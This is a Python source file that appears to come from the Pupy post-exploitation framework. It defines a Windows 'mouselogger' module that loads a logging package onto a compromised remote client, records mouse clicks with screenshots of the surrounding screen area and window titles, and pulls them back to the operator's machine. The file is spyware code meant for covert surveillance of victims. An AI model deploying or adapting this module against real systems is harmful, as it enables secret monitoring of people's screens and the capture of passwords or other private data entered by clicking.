# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.

from pupylib.PupyModule import *
import logging
import traceback
import time
import os
import os.path
import base64
from pupylib.utils.rpyc_utils import obtain, redirected_stdo

def pil_save(filename, pixels, width, height):
    from PIL import Image, ImageFile
    buffer_len = (width * 3 + 3) & -4
    img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
    ImageFile.MAXBLOCK = width * height
    img=img.transpose(Image.FLIP_TOP_BOTTOM)
    img.save(filename, quality=95, optimize=True, progressive=True)

__class_name__="MouseLoggerModule"

@config(compat="windows", cat="gather")
class MouseLoggerModule(PupyModule):
    """ log mouse clicks and take screenshots of areas around it """
    # WARNING : screenshots are kept in memory before beeing dumped
    #TODO change that and add a callback to automatically send back screenshots without need for dumping
    daemon=True
    unique_instance=True

    def __init__(self, *args, **kwargs):
        PupyModule.__init__(self, *args, **kwargs)
        self.mouselogger=None

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='mouselogger', description=self.__doc__)
        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def stop_daemon(self):
        self.success("mouselogger stopped")
        
    def run(self, args):
        try:
            os.makedirs(os.path.join("data","mouselogger"))
        except Exception:
            pass
        if args.action=="start":
            self.client.load_package("pupwinutils.mouselogger")
            if self.mouselogger:
                self.error("the mouselogger is already started")
            else:
                self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].get_mouselogger()
                if not self.mouselogger.is_alive():
                    with redirected_stdo(self.client.conn):
                        self.mouselogger.start()
                    self.success("mouselogger started")
                else:
                    self.success("previously started mouselogger session retrieved")
        else:
            if not self.mouselogger:
                self.error("the mouselogger is not running")
                return
            if args.action=="dump":
                self.success("dumping recorded mouse clicks :")
                screenshots_list=obtain(self.mouselogger.retrieve_screenshots())

                self.success("%s screenshots taken"%len(screenshots_list))
                for d, height, width, exe, win_title, buf in screenshots_list:
                    try:
                        filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+win_title.decode("utf8",errors="ignore").replace(" ","_").replace("\\","").replace("/","")+"_"+d.replace(" ","_").replace(":","-")+".jpg")
                        pil_save(filepath, base64.b64decode(buf), width, height)
                        self.info("screenshot saved to %s"%filepath)
                    except Exception as e:
                        self.error("Error saving a screenshot: %s"%str(e))
            elif args.action=="stop":
                self.mouselogger.stop()
                self.job.stop()



